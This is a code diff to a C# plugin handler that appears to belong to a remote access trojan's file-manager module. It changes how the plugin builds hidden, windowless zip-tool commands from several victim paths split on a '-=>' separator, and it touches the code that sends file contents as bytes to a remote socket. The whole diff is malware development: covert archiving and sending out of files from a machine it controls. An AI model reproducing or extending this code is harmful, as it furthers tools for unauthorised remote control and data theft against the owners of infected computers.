@@ -140,11 +140,24 @@ namespace Plugin.Handler
                             }
                             if (unpack_msgpack.ForcePathObject("Zip").AsString == "true")
                             {
-                                ZipCommandLine(unpack_msgpack.ForcePathObject("Path").AsString, true);
+                                StringBuilder sb = new StringBuilder();
+                                StringBuilder location = new StringBuilder();
+                                foreach (string path in unpack_msgpack.ForcePathObject("Path").AsString.Split(new[] { "-=>" }, StringSplitOptions.None))
+                                {
+                                    if (!string.IsNullOrWhiteSpace(path))
+                                    {
+                                        sb.Append($"-ir!\"{path}\" ");
+                                        if (location.Length == 0)
+                                        location.Append(Path.GetFullPath(path));
+                                    }
+                                }
+                                Debug.WriteLine(sb.ToString());
+                                Debug.WriteLine(location.ToString());
+                                ZipCommandLine(sb.ToString(), true, location.ToString());
                             }
                             else
                             {
-                                ZipCommandLine(unpack_msgpack.ForcePathObject("Path").AsString, false);
+                                ZipCommandLine(unpack_msgpack.ForcePathObject("Path").AsString, false, "");
                             }
                             break;
                         }
@@ -164,14 +177,14 @@ namespace Plugin.Handler
             }
         }
 
-        private void ZipCommandLine(string args, bool isZip)
+        private void ZipCommandLine(string args, bool isZip, string location)
         {
             if (isZip)
             {
                 Process.Start(new ProcessStartInfo
                 {
                     FileName = "\"" + Packet.ZipPath + "\"",
-                    Arguments = $"a -r \"{args}.zip\" \"{args}\" -y",
+                    Arguments = $"a -r \"{location}.zip\" {args} -y",
                     WindowStyle = ProcessWindowStyle.Hidden,
                     CreateNoWindow = true,
                     UseShellExecute = false,
@@ -351,7 +364,6 @@ namespace Plugin.Handler
                 msgpack2.ForcePathObject("Name").AsString = Path.GetFileName(file);
                 msgpack2.ForcePathObject("File").LoadFileAsBytes(file);
                 tempSocket.Send(msgpack2.Encode2Bytes());
-                tempSocket.Dispose();
             }
             catch
             {
